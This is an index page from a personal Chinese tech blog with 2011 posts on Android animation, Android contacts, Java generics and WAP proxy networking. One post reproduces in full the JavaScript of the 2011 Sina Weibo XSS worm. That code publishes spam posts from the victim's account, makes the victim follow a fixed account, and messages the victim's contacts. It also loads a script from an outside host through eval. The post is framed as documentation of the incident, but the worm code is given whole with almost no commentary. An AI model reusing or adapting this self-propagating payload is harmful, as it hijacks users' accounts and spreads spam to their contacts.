<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <title>jfo planet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="jfo planet">
<meta property="og:url" content="http://blog.pickbox.me/page/14/index.html">
<meta property="og:site_name" content="jfo planet">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="jfo planet">
  
    <link rel="alternative" href="/atom.xml" title="jfo planet" type="application/atom+xml">
  
  
    <link rel="icon" href="//favicon.ico">
  
  <script src="/style.js"></script>
  

</head>

<body>
  <div id="container">
    <div class="left-col">
      <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img src="http://img.pickbox.me/wp-content/uploads/penguin.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">jfo</a></h1>
		</hgroup>

		
		<p class="header-subtitle">Hope is the best gift that tomorrow gives.</p>
		

		<nav class="header-menu">
			<ul>
			
				<li><a href="/">主页</a></li>
	        
			</ul>
		</nav>
		<nav class="header-smart-menu">
	        
    		
    			
    			<a class="js-smart-menu" data-idx="0" href="javascript:void(0)">所有文章</a>
    			
    			
            
    			
    			<a class="js-smart-menu" data-idx="1" href="javascript:void(0)">分类</a>
    			
    			
            
    			
    			<a class="js-smart-menu" data-idx="2" href="javascript:void(0)">友链</a>
    			
    			
            
    			
    			<a class="js-smart-menu" data-idx="3" href="javascript:void(0)">关于我</a>
    			
    			
            
		</nav>
		<nav class="header-nav">
			<div class="social">
				
					<a class="github" target="_blank" href="https://github.com/jfojfo" title="github">github</a>
		        
					<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/jfojfo" title="zhihu">zhihu</a>
		        
			</div>
		</nav>
	</header>		
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"><i class="icon-list"></i></div>
  		<h1 class="header-author js-mobile-header hide">jfo</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				
					<img src="http://img.pickbox.me/wp-content/uploads/penguin.gif" class="js-avatar">
				
			</div>
			<hgroup>
			  <h1 class="header-author">jfo</h1>
			</hgroup>
			
			<p class="header-subtitle">Hope is the best gift that tomorrow gives.</p>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/jfojfo" title="github">github</a>
			        
						<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/jfojfo" title="zhihu">zhihu</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>

      <div class="body-wrap">
        
  
    <article id="post-Property-Animation-in-Honeycomb" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2011/07/26/Property-Animation-in-Honeycomb/">Property Animation in Honeycomb</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
         <p><a href="http://android-developers.blogspot.com/2011/02/animation-in-honeycomb.html" target="_blank">http://android-developers.blogspot.com/2011/02/animation-in-honeycomb.html</a></p><p>&nbsp;</p><p>1.使用ValueAnimator</p><p>在回调函数中执行动画操作</p><p>ValueAnimatoranim=ValueAnimator.ofFloat(0f,1f);</p><p>//&nbsp;ValueAnimatoranim=ValueAnimator.ofInt(0,100);<br>anim.setDuration(500);</p><p>anim.addUpdateListener(newValueAnimator.AnimatorUpdateListener(){<br>&nbsp; &nbsp; &nbsp; &nbsp;publicvoidonAnimationUpdate(ValueAnimatoranimation){<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Floatvalue=(Float)animation.getAnimatedValue();<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;// do something with value…<br>&nbsp; &nbsp; &nbsp; &nbsp;}<br>&nbsp; &nbsp;});<br>anim.start();</p><p>—–</p><p>publicclassPointEvaluatorimplementsTypeEvaluator{<br>&nbsp; &nbsp; &nbsp; &nbsp;publicObjectevaluate(floatfraction,ObjectstartValue,ObjectendValue){<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PointstartPoint=(Point)startValue;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PointendPoint=(Point)endValue;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;returnnewPoint(startPoint.x+fraction<em>(endPoint.x-startPoint.x),<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; startPoint.y+fraction</em>(endPoint.y-startPoint.y));<br>&nbsp; &nbsp; &nbsp; &nbsp;}<br>&nbsp; &nbsp;}</p><p>Pointp0=newPoint(0,0);<br>Pointp1=newPoint(100,200);<br>ValueAnimatoranim=ValueAnimator.ofObject(newPointEvaluator(),p0,p1);<br></p><p><br></p><p>写在xml中：</p><p>&lt;animatorxmlns:android=&quot;<a href="http://schemas.android.com/apk/res/android&amp;quot" target="_blank" rel="external">http://schemas.android.com/apk/res/android&amp;quot</a>;<br>&nbsp; &nbsp; &nbsp; &nbsp;android:valueFrom=&quot;0&quot;<br>&nbsp; &nbsp; &nbsp; &nbsp;android:valueTo=&quot;100&quot;<br>&nbsp; &nbsp; &nbsp; &nbsp;android:valueType=&quot;intType&quot;/&gt;</p><p><br></p><p>2.ObjectAnimator</p><p>ObjectAnimator.ofFloat(myObject,&quot;alpha&quot;,0f).start();</p><p>或者写在xml中</p><p>&lt;objectAnimatorxmlns:android=&quot;<a href="http://schemas.android.com/apk/res/android&amp;quot" target="_blank" rel="external">http://schemas.android.com/apk/res/android&amp;quot</a>;<br>&nbsp; &nbsp; &nbsp; &nbsp;android:valueTo=&quot;0&quot;<br>&nbsp; &nbsp; &nbsp; &nbsp;android:propertyName=&quot;alpha&quot;/&gt;</p><p>ObjectAnimatoranim=AnimatorInflator.loadAnimator(context,resID);<br>anim.setTarget(myObject);<br>anim.start();</p><p>对于ObjectAnimator，必须有该property的get和set函数，会在运行时通过reflection调用：</p><p>publicvoidsetAlpha(floatvalue);<br>publicfloatgetAlpha();</p><p><br></p><p>3.AnimatorSet</p><p>ObjectAnimatorfadeOut=ObjectAnimator.ofFloat(v1,&quot;alpha&quot;,0f);<br>ObjectAnimatormover=ObjectAnimator.ofFloat(v2,&quot;translationX&quot;,-500f,0f);<br>ObjectAnimatorfadeIn=ObjectAnimator.ofFloat(v2,&quot;alpha&quot;,0f,1f);<br>AnimatorSetanimSet=newAnimatorSet().play(mover).with(fadeIn).after(fadeOut);;<br>animSet.start();</p><p>&nbsp;</p><p>4.ViewPropertyAnimator</p><p></p><p></p><p></p><p></p><p></p><p>myView.animate().x(50f).y(100f);&nbsp;&nbsp;（animate()&nbsp;returns an instance of ViewPropertyAnimator）</p><p>等价==》</p><p>PropertyValuesHolder pvhX = PropertyValuesHolder.ofFloat(&quot;x&quot;, 50f);</p><p>PropertyValuesHolder pvhY = PropertyValuesHolder.ofFloat(&quot;y&quot;, 100f);</p><p>ObjectAnimator.ofPropertyValuesHolder(myView, pvhX, pvyY).start();</p><p></p><p>比AnimatorSet效率高==》</p><p>ObjectAnimator animX = ObjectAnimator.ofFloat(myView, &quot;x&quot;, 50f);</p><p>ObjectAnimator animY = ObjectAnimator.ofFloat(myView, &quot;y&quot;, 100f);</p><p>AnimatorSet animSetXY = new AnimatorSet();</p><p>animSetXY.playTogether(animX, animY);</p><p>animSetXY.start();</p><p><br></p><p><br></p><p><br></p><p></p> 
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2011/07/26/Property-Animation-in-Honeycomb/" class="archive-article-date">
  	<time datetime="2011-07-26T11:26:00.000Z" itemprop="datePublished"><i class="icon-clock"></i>2011-07-26</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/Android/">Android</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-Android联系人数据库" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2011/07/24/Android联系人数据库/">Android联系人数据库</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
         <p><a href="http://jasonshieh.iteye.com/blog/793537" target="_blank" rel="external">http://jasonshieh.iteye.com/blog/793537</a></p><p>&nbsp;</p><p>URI:</p><p><u>ContactsContract.Contacts.CONTENT_URI</u> （content://com.android.contacts/contacts）</p><p></p><p>&nbsp; &nbsp; &nbsp; &nbsp; ContactsContract.Contacts._ID</p><p>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;ContactsContract.Contacts.DISPLAY_NAME</p><p>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;ContactsContract.Contacts.HAS_PHONE_NUMBER</p><br><p><u>ContactsContract.CommonDataKinds.Phone.CONTENT_URI</u>&nbsp;（content://com.android.contacts/data/phones）</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ContactsContract.CommonDataKinds.Phone.CONTACT_ID</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ContactsContract.CommonDataKinds.Phone.NUMBER</p><p>&nbsp;</p><p><u>ContactsContract.CommonDataKinds.Email.CONTENT_URI</u> （content://com.android.contacts/data/emails）</p><p>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;ContactsContract.CommonDataKinds.Email.CONTACT_ID</p><p>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;ContactsContract.CommonDataKinds.Email.DATA</p><p>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;ContactsContract.CommonDataKinds.Email.TYPE</p><p>&nbsp;</p><p><u>ContactsContract.Data.CONTENT_URI</u> （content://com.android.contacts/data）（ContactsContract.Data.CONTENT_TYPE = &quot;vnd.android.cursor.dir/data&quot;）</p><p>Note:</p><p>ContactsContract.Data.MIMETYPE–&gt;ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE</p><p>ContactsContract.Data.DATA1–&gt;ContactsContract.CommonDataKinds.Note.NOTE</p><p>Postal:</p><p>ContactsContract.Data.MIMETYPE–&gt;ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE</p><p>ContactsContract.Data.DATA1–&gt;ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS</p><p>ContactsContract.Data.DATA5–&gt;ContactsContract.CommonDataKinds.StructuredPostal.POBOX</p><p>ContactsContract.Data.DATA4–&gt;ContactsContract.CommonDataKinds.StructuredPostal.STREET</p><p>ContactsContract.Data.DATA7–&gt;ContactsContract.CommonDataKinds.StructuredPostal.CITY</p><p>ContactsContract.Data.DATA9–&gt;ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE</p><p>Email:</p><p></p><p>ContactsContract.Data.MIMETYPE–&gt;ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE （&quot;vnd.android.cursor.item/email_v2&quot;）</p><p>ContactsContract.Data.DATA1–&gt;ContactsContract.CommonDataKinds.Email.ADDRESS</p><p></p><p>ContactsContract.Data.DATA4–&gt;ContactsContract.CommonDataKinds.Email.DISPLAY_NAME</p><p>Phone:</p><p></p><p>ContactsContract.Data.MIMETYPE–&gt;ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE （&quot;vnd.android.cursor.item/phone_v2&quot;）</p><p>ContactsContract.Data.DATA1–&gt;ContactsContract.CommonDataKinds.Phone.NUMBER</p>Photo:<p>ContactsContract.Data.MIMETYPE–&gt;ContactsContract.CommonDataKinds.Photo.CONTENT_ITEM_TYPE （&quot;vnd.android.cursor.item/photo&quot;）</p><p>ContactsContract.Data.DATA15–&gt;ContactsContract.CommonDataKinds.Photo.PHOTO</p>Im:<p>ContactsContract.Data.MIMETYPE–&gt;ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE （&quot;vnd.android.cursor.item/im&quot;）</p><p>ContactsContract.Data.DATA5–&gt;ContactsContract.CommonDataKinds.Im.PROTOCOL</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p>ContactsContract.Data.DATA6–&gt;ContactsContract.CommonDataKinds.Im.CUSTOM_PROTOCOL</p><p></p><p></p><p></p><p>ContactsContract.Data.DATA1–&gt;ContactsContract.CommonDataKinds.Im.DATA （从CommonColumns继承而来）</p><p>ContactsContract.Data.DATA2–&gt;ContactsContract.CommonDataKinds.Im.TYPE （从CommonColumns继承而来）</p><br><br><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p> 
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2011/07/24/Android联系人数据库/" class="archive-article-date">
  	<time datetime="2011-07-24T10:14:00.000Z" itemprop="datePublished"><i class="icon-clock"></i>2011-07-24</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/Android/">Android</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-Java-Generic-Class" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2011/07/23/Java-Generic-Class/">Java Generic Class</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
         <p><a href="http://download.oracle.com/javase/tutorial/extra/generics/fineprint.html" target="_blank" rel="external">http://download.oracle.com/javase/tutorial/extra/generics/fineprint.html</a></p><p>A Generic Class is Shared by All Its Invocations</p><p>What does the following code fragment print?</p><p>List &lt;String&gt; l1 = new ArrayList&lt;String&gt;();&nbsp;</p><p>List&lt;Integer&gt; l2 = new ArrayList&lt;Integer&gt;();&nbsp;</p><p>System.out.println(l1.getClass() == l2.getClass());&nbsp;</p><p>You might be tempted to say&nbsp;false, but you’d be wrong. It prints&nbsp;true, because all instances of a generic class have the same run-time class, regardless of their actual type parameters.</p><p>Indeed, what makes a class generic is the fact that it has the same behavior for all of its possible type parameters; the same class can be viewed as having many different types.</p><p>As consequence, the static variables and methods of a class are also shared among all the instances. That is why it is illegal to refer to the type parameters of a type declaration in a static method or initializer, or in the declaration or initializer of a static variable.</p><p>Casts and InstanceOf</p><p>Another implication of the fact that a generic class is shared among all its instances, is that it usually makes no sense to ask an instance if it is an instance of a particular invocation of a generic type:</p><p>Collection cs = new ArrayList&lt;String&gt;();&nbsp;</p><p>if (cs <b>instanceof</b> Collection&lt;String&gt;) { …} // <i>Illegal.</i></p><p>similarly, a cast such as</p><p>Collection&lt;String&gt; cstr = (Collection&lt;String&gt;) cs; // <i>Unchecked warning,</i></p><p>gives an unchecked warning, since this isn’t something the runtime system is going to check for you.</p><p>The same is true of type variables</p><p>&lt;T&gt; T badCast(T t, Object o) {<b>return</b> (T) o; // <i>Unchecked warning.</i>&nbsp;</p><p>&nbsp;}&nbsp;</p><p>Type variables don’t exist at run time. This means that they entail no performance overhead in either time nor space, which is nice. Unfortunately, it also means that you can’t reliably use them in casts.</p><p>&nbsp;</p><p>&nbsp;</p><p></p><p></p> 
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2011/07/23/Java-Generic-Class/" class="archive-article-date">
  	<time datetime="2011-07-23T06:34:00.000Z" itemprop="datePublished"><i class="icon-clock"></i>2011-07-23</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/Java/">Java</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-新浪微博的XSS攻击的JS代码" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2011/07/17/新浪微博的XSS攻击的JS代码/">新浪微博的XSS攻击的JS代码</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
         <p></p><p>新浪微博事件利用了微博广场页面 <a href="http://weibo.com/pub/star" target="_blank" rel="external">http://weibo.com/pub/star</a> 的一个URL注入js脚本，发微博、发站内消息。</p><p>更多参考<a href="http://coolshell.cn/articles/4914.html" target="_blank" rel="external">http://coolshell.cn/articles/4914.html</a></p><p></p><p>function createXHR(){</p><p>&nbsp; &nbsp; return window.XMLHttpRequest?</p><p>&nbsp; &nbsp; new XMLHttpRequest():</p><p>&nbsp; &nbsp; new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</p><p>}</p><p>function getappkey(url){</p><p>&nbsp; &nbsp; xmlHttp = createXHR();</p><p>&nbsp; &nbsp; xmlHttp.open(&quot;GET&quot;,url,false);</p><p>&nbsp; &nbsp; xmlHttp.send();</p><p>&nbsp; &nbsp; result = xmlHttp.responseText;</p><p>&nbsp; &nbsp; id_arr = ‘’;</p><p>&nbsp; &nbsp; id = result.match(/namecard=&quot;true&quot; title=&quot;[^&quot;]<em>/g);</em></p><p>&nbsp; &nbsp; for(i=0;i&lt;id.length;i++){</p><p>&nbsp; &nbsp; &nbsp; &nbsp; sum = id[i].toString().split(‘&quot;’)[3];</p><p>&nbsp; &nbsp; &nbsp; &nbsp; id_arr += sum + ‘||’;</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; return id_arr;</p><p>}</p><p>function random_msg(){</p><p>&nbsp; &nbsp; link = ‘ <a href="http://163.fm/PxZHoxn?id=" target="_blank" rel="external">http://163.fm/PxZHoxn?id=</a>‘ + new Date().getTime();;</p><p>&nbsp; &nbsp; var msgs = [</p><p>&nbsp; &nbsp; ‘郭美美事件的一些未注意到的细节：’,</p><p>&nbsp; &nbsp; ‘建党大业中穿帮的地方：’,</p><p>&nbsp; &nbsp; ‘让女人心动的100句诗歌：’,</p><p>&nbsp; &nbsp; ‘3D肉团团高清普通话版种子：’,</p><p>&nbsp; &nbsp; ‘这是传说中的神仙眷侣啊：’,</p><p>&nbsp; &nbsp; ‘惊爆!范冰冰艳照真流出了：’,</p><p>&nbsp; &nbsp; ‘杨幂被爆多次被潜规则:’,</p><p>&nbsp; &nbsp; ‘傻仔拿锤子去抢银行：’,</p><p>&nbsp; &nbsp; ‘可以监听别人手机的软件：’,</p><p>&nbsp; &nbsp; ‘个税起征点有望提到4000：’];</p><p>&nbsp; &nbsp; var msg = msgs[Math.floor(Math.random()msgs.length)] + link;</p><p>&nbsp; &nbsp; msg = encodeURIComponent(msg);</p><p>&nbsp; &nbsp; return msg;</p><p>}</p><p>function post(url,data,sync){</p><p>&nbsp; &nbsp; xmlHttp = createXHR();</p><p>&nbsp; &nbsp; xmlHttp.open(&quot;POST&quot;,url,sync);</p><p>&nbsp; &nbsp; xmlHttp.setRequestHeader(&quot;Accept&quot;,&quot;text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8&quot;);</p><p>&nbsp; &nbsp; xmlHttp.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;);</p><p>&nbsp; &nbsp; xmlHttp.send(data);</p><p>}</p><p>function publish(){</p><p>&nbsp; &nbsp; url = ‘<a href="http://weibo.com/mblog/publish.php?rnd=" target="_blank" rel="external">http://weibo.com/mblog/publish.php?rnd=</a>‘ + new Date().getTime();</p><p>&nbsp; &nbsp; data = ‘content=’ + random_msg() + ‘&amp;pic=&amp;styleid=2&amp;retcode=’;</p><p>&nbsp; &nbsp; post(url,data,true);</p><p>}</p><p>function follow(){</p><p>&nbsp; &nbsp; url = ‘<a href="http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=" target="_blank" rel="external">http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=</a>‘ + new Date().getTime();</p><p>&nbsp; &nbsp; data = ‘uid=’ + 2201270010 + ‘&amp;fromuid=’ + $CONFIG.$uid + ‘&amp;refer_sort=profile&amp;atnId=profile’;</p><p>&nbsp; &nbsp; post(url,data,true);</p><p>}</p><p>function message(){</p><p>&nbsp; &nbsp; url = ‘<a href="http://weibo.com/" target="_blank" rel="external">http://weibo.com/</a>‘ + $CONFIG.$uid + ‘/follow’;</p><p>&nbsp; &nbsp; ids = getappkey(url);</p><p>&nbsp; &nbsp; id = ids.split(‘||’);</p><p>&nbsp; &nbsp; for(i=0;i&lt;id.length - 1 &amp; i&lt;5;i++){</p><p>&nbsp; &nbsp; &nbsp; &nbsp; msgurl = ‘<a href="http://weibo.com/message/addmsg.php?rnd=" target="_blank" rel="external">http://weibo.com/message/addmsg.php?rnd=</a>‘ + new Date().getTime();</p><p>&nbsp; &nbsp; &nbsp; &nbsp; msg = random_msg();</p><p>&nbsp; &nbsp; &nbsp; &nbsp; msg = encodeURIComponent(msg);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; user = encodeURIComponent(encodeURIComponent(id[i]));</p><p>&nbsp; &nbsp; &nbsp; &nbsp; data = ‘content=’ + msg + ‘&amp;name=’ + user + ‘&amp;retcode=’;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; post(msgurl,data,false);</p><p>&nbsp; &nbsp; }</p><p>}</p><p>function main(){</p><p>&nbsp; &nbsp; try{</p><p>&nbsp; &nbsp; &nbsp; &nbsp; publish();</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; catch(e){}</p><p>&nbsp; &nbsp; try{</p><p>&nbsp; &nbsp; &nbsp; &nbsp; follow();</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; catch(e){}</p><p>&nbsp; &nbsp; try{</p><p>&nbsp; &nbsp; &nbsp; &nbsp; message();</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; catch(e){}</p><p>}</p><p>try{</p><p>&nbsp; &nbsp; x=&quot;g=document.createElement(‘script’);g.src=’<a href="http://www.2kt.cn/images/t.js&#39;;document.body.appendChild(g)&quot;;window.opener.eval(x" target="_blank" rel="external">http://www.2kt.cn/images/t.js&#39;;document.body.appendChild(g)&quot;;window.opener.eval(x</a>);</p><p>}</p><p>catch(e){}</p><p>main();</p><p>var t=setTimeout(‘location=&quot;<a href="http://weibo.com/pub/topic&quot;;&#39;,5000" target="_blank" rel="external">http://weibo.com/pub/topic&quot;;&#39;,5000</a>);</p><p>&nbsp;</p><p></p> 
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2011/07/17/新浪微博的XSS攻击的JS代码/" class="archive-article-date">
  	<time datetime="2011-07-17T05:07:00.000Z" itemprop="datePublished"><i class="icon-clock"></i>2011-07-17</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/python-js-php-html-mysql-http/">python/js/php/html/mysql/http</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-解决Android下Wap模式无法访问网络的问题" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2011/07/15/解决Android下Wap模式无法访问网络的问题/">解决Android下Wap模式无法访问网络的问题</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
         <p></p><p><a href="http://blog.liaoxiaoqi.com/?p=563" target="_blank" rel="external">http://blog.liaoxiaoqi.com/?p=563</a></p><p>经过测试发现，这个问题的产生是由于运营商（不管是移动、联通还是电信都一个德行。。）提供的wap方式访问网络需要通过代理网关，而我们在程序中使用的网络连接是http直连的方式，因此无法访问网络。解决这个问题的主要思路包括：</p>检测当前网络环境，判断网络状态在联网状态下，判断联网方式是Wifi或者GPRS在GPRS连接方式下，判断上网方式是net或是wap对于wap连接方式，在程序进行连接时，设置上相应的代理即可。<p>主要用到的代码如下：</p><p></p><p>&nbsp;</p><p></p><p>////////////////////////////////////////////////////////////////////////////////</p><p>// 采用URLConnection的方式</p><p>////////////////////////////////////////////////////////////////////////////////</p><p>Proxy proxy;</p><p>boolean getSuccess = false;</p><p>URL url;</p><p>URLConnection urlConnection = null;</p><p>NetType netType = NetworkControl.getNetType(context);</p><p>InputStreamReader isr;</p><p>&nbsp;</p><p>url = new URL(httpUrl);</p><p>// 判断Wap网络并设置代理</p><p>if (netType != null &amp;&amp; netType.isWap()) {</p><p>proxy = new Proxy(java.net.Proxy.Type.HTTP, new InetSocketAddress(netType.getProxy(), netType.getPort()));</p><p>urlConnection = url.openConnection(proxy);</p><p>urlConnection.connect();</p><p>isr = new InputStreamReader(urlConnection.getInputStream(), &quot;UTF-8&quot;);</p><p>} else {</p><p>isr = new InputStreamReader(url.openStream(), &quot;GBK&quot;);</p><p>}</p><p>BufferedReader br = new BufferedReader(isr);</p><p>…</p><p>&nbsp;</p><p>////////////////////////////////////////////////////////////////////////////////</p><p>// 采用HttpClient的方式</p><p>////////////////////////////////////////////////////////////////////////////////</p><p>HttpClient client = new DefaultHttpClient();</p><p>// 判断Wap网络并设置代理</p><p>NetType netType = NetworkControl.getNetType(context);</p><p>if (netType != null &amp;&amp; netType.isWap()) {</p><p>HttpHost proxy = new HttpHost(netType.getProxy(), netType.getPort());</p><p>client.getParams().setParameter(ConnRouteParams.DEFAULT_PROXY, proxy);</p><p>}</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp; &nbsp; public static class NetworkControl {</p><p>&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; public static boolean isNetworkAvailable(Context context){</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ConnectivityManager connectivityManager = (ConnectivityManager)&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; context.getSystemService(Context.CONNECTIVITY_SERVICE);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NetworkInfo info = connectivityManager.getActiveNetworkInfo();</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return info != null;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; public static NetType getNetworkType(Context context){</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NetType netType = new NetType();</p><p>&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ConnectivityManager connectivityManager = (ConnectivityManager)&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; context.getSystemService(Context.CONNECTIVITY_SERVICE);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NetworkInfo info = connectivityManager.getActiveNetworkInfo();</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(info == null)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return netType;</p><p>&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; String type = info.getTypeName();</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (type.equalsIgnoreCase(&quot;WIFI&quot;)) {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; netType.setType(NetType.NET_TYPE_WIFI);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else if(type.equalsIgnoreCase(&quot;MOBILE&quot;)) {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // GPRS</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; netType.setType(NetType.NET_TYPE_MOBILE_NET);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; String proxyHost = android.net.Proxy.getDefaultHost();</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (!TextUtils.isEmpty(proxyHost)) {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // WAP</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; netType.setType(NetType.NET_TYPE_MOBILE_WAP);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; netType.setProxy(proxyHost);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; netType.setPort(android.net.Proxy.getDefaultPort());</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return netType;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; public static class NetType {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public static final int NET_TYPE_UNAVAILABLE = 0;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public static final int NET_TYPE_WIFI = 1;</p><p>&nbsp; &nbsp; &nbsp; 